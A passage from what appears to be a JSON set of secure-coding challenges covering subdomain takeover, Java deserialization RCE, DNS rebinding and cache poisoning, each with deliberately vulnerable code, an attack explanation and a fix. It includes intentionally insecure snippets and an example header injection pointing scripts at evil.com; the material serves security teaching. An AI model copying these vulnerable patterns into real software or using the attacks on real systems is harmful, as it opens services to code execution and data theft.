    "challengeDetails": "Subdomain takeover occurs when a DNS record points to a third-party service (Heroku, GitHub Pages, Netlify, Azure, S3) that has been deprovisioned, but the DNS record is never removed. Many cloud platforms allow anyone to claim an unclaimed subdomain name — so an attacker who registers `old-app-name.herokuapp.com` now controls all traffic destined for `staging.app.com`. This is catastrophic: the attacker can serve arbitrary content on your domain, issue TLS certificates (via DNS challenge), steal cookies scoped to `*.app.com`, perform phishing with a trusted domain, and exfiltrate data from applications that fetch config from `staging.app.com`. The code in this challenge fetches an API key from the compromised subdomain — that key now goes to the attacker. Prevention requires infrastructure hygiene: remove DNS records before deprovisioning cloud resources, audit CNAME targets periodically with tools like `subjack`, and implement DNS lifecycle management in your IaC decommissioning runbooks.",
    "initialCode": "// VULNERABLE: Infrastructure left a dangling DNS CNAME\n// staging.app.com CNAME old-app-name.herokuapp.com (resource deleted!)\n\nconst config = await fetch('https://staging.app.com/config.json');\n// Attacker now controls staging.app.com content!\nconst { apiKey, featureFlags } = await config.json();",
    "recommendation": "Before deprovisioning any cloud resource, remove the DNS record first. Run periodic audits with tools like `subjack` or `can-i-take-over-xyz`. Implement DNS record lifecycle management in your infrastructure-as-code decommissioning checklist."
  },
  {
    "title": "Deserialization RCE via Java ObjectInputStream",
    "difficulty": "Hard",
    "description": "A REST API endpoint accepts Base64-encoded Java serialized objects and passes them directly to `ObjectInputStream`. Gadget chains in common libraries allow arbitrary code execution.",
    "programmingLanguage": "Java",
    "challengeDetails": "Java's native serialization mechanism, `ObjectInputStream.readObject()`, reconstructs arbitrary Java objects from a byte stream — including invoking methods during deserialization through 'gadget chains'. A gadget chain is a sequence of legitimate class methods that, when triggered by the deserialization of a crafted payload, executes attacker-controlled code. The `ysoserial` tool generates ready-made gadget chain payloads for common libraries (Commons Collections, Spring, Hibernate) that are almost certainly in your dependency tree. An attacker base64-encodes a ysoserial payload and POSTs it to this endpoint. The `readObject()` call executes `Runtime.exec()` with attacker-specified arguments — shell command injection with the server's full privileges. The fix is to never deserialize Java objects from untrusted sources. Replace with JSON (Jackson) or Protocol Buffers. If you must use Java serialization, use a filtering `ObjectInputStream` that whitelists only your specific expected classes and rejects everything else.",
    "initialCode": "// VULNERABLE: Deserializing untrusted ObjectInputStream data\n@PostMapping(\"/api/session/restore\")\npublic ResponseEntity<?> restoreSession(\n        @RequestBody String base64Data) throws Exception {\n    byte[] bytes = Base64.getDecoder().decode(base64Data);\n    ObjectInputStream ois =\n        new ObjectInputStream(new ByteArrayInputStream(bytes));\n    SessionData session = (SessionData) ois.readObject();  // RCE!\n    sessionManager.restore(session);\n    return ResponseEntity.ok(\"Session restored\");\n}",
    "recommendation": "Never deserialize data from untrusted sources using Java `ObjectInputStream`. Use JSON (Jackson) or Protocol Buffers instead. If Java serialization is unavoidable, use a filtering `ObjectInputStream` that whitelists expected classes."
  },
  {
    "title": "DNS Rebinding Attack on Internal API",
    "difficulty": "Hard",
    "description": "An SSRF protection function resolves the hostname and checks against a blocklist, but the DNS resolution and the HTTP request are separate operations. An attacker-controlled DNS server returns a public IP for the check, then a private IP for the actual connection.",
    "programmingLanguage": "Python",
    "challengeDetails": "DNS rebinding is a sophisticated SSRF bypass that exploits the gap between IP validation and connection. This code resolves the hostname once for the IP check, then passes the original URL (with the hostname) to `requests.get()`, which performs its own DNS lookup at connection time. The attacker controls a domain with a very low TTL (1 second). For the validation lookup, their DNS server returns a public IP (passing the check). For the subsequent lookup during the actual HTTP request — after the TTL expires — it returns `192.168.1.1` or `169.254.169.254`. The connection bypasses the blocklist because the validation and the connection use different resolved IPs. The fix is to resolve the hostname once, validate the IP, then connect directly to that IP address (not the hostname), preventing re-resolution. Use the IP as the URL host and pass the original hostname as the `Host` header.",
    "initialCode": "# VULNERABLE: DNS rebinding bypass\nimport socket, requests\n\ndef safe_fetch(url):\n    hostname = urlparse(url).hostname\n    ip = socket.gethostbyname(hostname)  # resolve once to check\n    private_ranges = ['10.', '172.16.', '192.168.', '127.']\n    if any(ip.startswith(r) for r in private_ranges):\n        raise ValueError(\"Private IP blocked\")\n    # DNS can rebind between this check and the actual request!\n    return requests.get(url, timeout=5)",
    "recommendation": "Resolve the hostname once, verify the IP, then connect to the resolved IP directly: replace the hostname in the URL with the validated IP and set the `Host` header manually. This prevents re-resolution at connection time."
  },
  {
    "title": "Cache Poisoning via Unkeyed Headers",
    "difficulty": "Hard",
    "description": "A CDN cache uses the URL as the cache key but does not include the `X-Forwarded-Host` header. A response reflecting this header is cached and served to all subsequent users.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "Web cache poisoning attacks exploit the difference between what the cache considers unique (the cache key) and what actually affects the response content. Here, `X-Forwarded-Host` influences the CDN base URL embedded in the page's script tags, but the CDN doesn't include it in the cache key. An attacker sends a request with `X-Forwarded-Host: evil.com` — the response contains `<script src=\"https://evil.com/static/app.js\">` and is cached. Every subsequent visitor receives this poisoned response and loads JavaScript from the attacker's domain, giving the attacker arbitrary code execution in every visitor's browser. Cache poisoning turns a single request into a persistent, scalable attack affecting all users. The fix is to never reflect request headers into responses, use only static hardcoded values for CDN URLs, and configure the CDN to include all response-influencing headers in the cache key.",
    "initialCode": "// VULNERABLE: Reflecting unkeyed header into response\napp.use((req, res, next) => {\n    const host = req.headers['x-forwarded-host'] || req.hostname;\n    // Attacker sets X-Forwarded-Host: evil.com\n    res.locals.cdnBase = `https://${host}/static`;\n    next();\n});\n\napp.get('/', (req, res) => {\n    // Cached response includes: <script src=\"https://evil.com/static/app.js\">\n    res.render('index', { cdnBase: res.locals.cdnBase });\n});",
    "recommendation": "Never reflect attacker-influenced headers (`X-Forwarded-Host`, `X-Original-URL`) into responses. Configure the CDN to include all response-influencing headers in the cache key. Use a static, hardcoded CDN base URL from configuration rather than request headers."
  }
];